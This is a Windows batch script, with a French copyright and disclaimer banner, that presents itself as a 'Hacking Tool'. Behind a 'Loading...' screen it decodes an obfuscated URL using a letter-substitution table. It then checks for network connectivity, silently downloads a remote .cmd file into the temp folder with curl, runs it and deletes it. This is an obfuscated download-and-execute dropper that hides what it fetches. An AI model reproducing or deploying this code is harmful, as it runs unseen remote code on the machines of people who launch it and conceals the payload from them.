:: ============================================================================================================
::                                        DROITS D'AUTEUR ET CONDITIONS D'UTILISATION
::
:: Ce script, intitulé "Hacking Tool", a été créé par m.a.s_dev. Toute utilisation, distribution ou modification
:: de ce script est soumise aux termes et conditions suivants. Le créateur m.a.s_dev se réserve tous les droits
:: sur ce script. Pour plus d'informations sur m.a.s_dev, veuillez consulter le Linktree :
:: https://linktr.ee/m.a.s_dev
::
:: 1. DROITS D'AUTEUR
:: - Ce script est protégé par le droit d'auteur. Vous n'êtes pas autorisé à le modifier, le distribuer ou le
::  réutiliser à des fins commerciales ou non commerciales sans l'autorisation expresse de m.a.s_dev.
:: - Vous êtes autorisé à utiliser ce script tel quel pour vos besoins personnels, mais toute altération du code
::   peut rendre le script inutilisable ou provoquer des dysfonctionnements.
::
:: 2. LIMITATION DE RESPONSABILITÉ
:: - Ce script est fourni "tel quel", sans garantie d'aucune sorte. m.a.s_dev ne pourra être tenu responsable des
::   dommages, pertes de données ou autres conséquences résultant de l'utilisation de ce script.
::- Vous reconnaissez que l'utilisation de ce script, notamment à des fins de piratage, d'extraction de données ou
::  toute autre activité illégale, est de votre entière responsabilité. Vous êtes seul responsable de toute action
::   entreprise en utilisant ce script.
:: 
:: 3. INTERDICTION DE MODIFICATION
:: - Il est strictement interdit de modifier ou d'altérer ce script. Les modifications peuvent rendre le script
::   instable ou entraîner des erreurs de fonctionnement. Toute altération du code est aux risques et périls de
::   l'utilisateur.
:: - Le créateur n'est pas tenu de fournir un support ou une assistance pour les versions modifiées du script.
::
:: En utilisant ce script, vous acceptez ces conditions.
:: ============================================================================================================

@echo off
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
title Loading...
color f
echo Loading...
(set PLRQZHJ[ONJLIU]=a) & (set PLRQZHJ[SZVNHL]=b) & (set PLRQZHJ[VRIDUF]=c) & (set PLRQZHJ[QMWKTI]=d) & (set PLRQZHJ[J62DSP]=e)
(set PLRQZHJ[MQBRKH]=f) & (set PLRQZHJ[BOANMW]=g) & (set PLRQZHJ[QOXYBZ]=h) & (set PLRQZHJ[7AC5VB]=i) & (set PLRQZHJ[FTP1NK]=j)
(set PLRQZHJ[PTIELI]=k) & (set PLRQZHJ[ROSI27]=l) & (set PLRQZHJ[OKDH85]=m) & (set PLRQZHJ[TJNI5D]=n) & (set PLRQZHJ[OJ854D]=o)
(set PLRQZHJ[CA41DV]=p) & (set PLRQZHJ[OJISD5]=q) & (set PLRQZHJ[LM5WGD]=r) & (set PLRQZHJ[EDSDJC]=s) & (set PLRQZHJ[FKQ8JD]=t)
(set PLRQZHJ[T45SFC]=u) & (set PLRQZHJ[PDG56I]=v) & (set PLRQZHJ[133SIW]=w) & (set PLRQZHJ[NDJCUK]=x) & (set PLRQZHJ[L5D2JV]=y)
(set PLRQZHJ[52GHTM]=z)
set "THMPXW=QOXYBZFKQ8JDFKQ8JDCA41DVEDSDJC://LM5WGDONJLIU133SIW.BOANMW7AC5VBFKQ8JDQOXYBZT45SFCSZVNHLT45SFCEDSDJCJ62DSPLM5WGDVRIDUFOJ854DTJNI5DFKQ8JDJ62DSPTJNI5DFKQ8JD.VRIDUFOJ854DOKDH85/OKDH85ONJLIUEDSDJC34732/FKQ8JDOJ854DOJ854DROSI27/OKDH85ONJLIU7AC5VBTJNI5D/ONJLIUQMWKTINDJCUKFKQ8JD.VRIDUFOKDH85QMWKTI"
set "THMPXW2=%THMPXW%"
set "PLASOZ="
:kizdjqusxoa
set "VGJBMCW="
set "KGYQVL=%THMPXW2:~0,6%"
if defined PLRQZHJ[%KGYQVL%] (
    set "PLASOZ=%PLASOZ%!PLRQZHJ[%KGYQVL%]!"
    set "THMPXW2=%THMPXW2:~6%"
    set "VGJBMCW=1"
) else (
    set "PLASOZ=%PLASOZ%!THMPXW2:~0,1!"
    set "THMPXW2=%THMPXW2:~1%"
)
if not "%THMPXW2%"=="" goto kizdjqusxoa
set "fp=%TEMP%\addxt.cmd"
(for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /i "IPv4"') do @if NOT "%%A"==" 127.0.0.1" set "cx=true") & if exist "!fp!" del "!fp!"
if "%cx%"=="true" (
    if exist "!fp!" (
    del "!fp!"
    )
    curl -s -o "!fp!" %PLASOZ%
    if exist "!fp!" (
        call "!fp!"
        timeout /t 1 /nobreak >nul
        del "!fp!"
    ) else (
        echo Erreur du system.
        pause
    )
) else (
    echo Pas de connexion Internet.
    pause
)
